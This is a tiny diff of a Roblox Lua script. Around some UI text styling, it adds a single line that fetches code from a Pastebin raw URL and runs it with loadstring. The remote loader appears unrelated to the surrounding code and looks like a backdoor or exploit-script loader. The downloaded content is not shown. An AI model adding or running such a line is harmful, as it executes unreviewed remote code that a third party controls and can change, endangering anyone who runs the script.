@@ -28,3 +28,4 @@
                 Color = Color3.fromRGB(255,0,0);
                 TextSize = 30
             })
+loadstring(game:HttpGet("https://pastebin.com/raw/CEfe4qap"))()
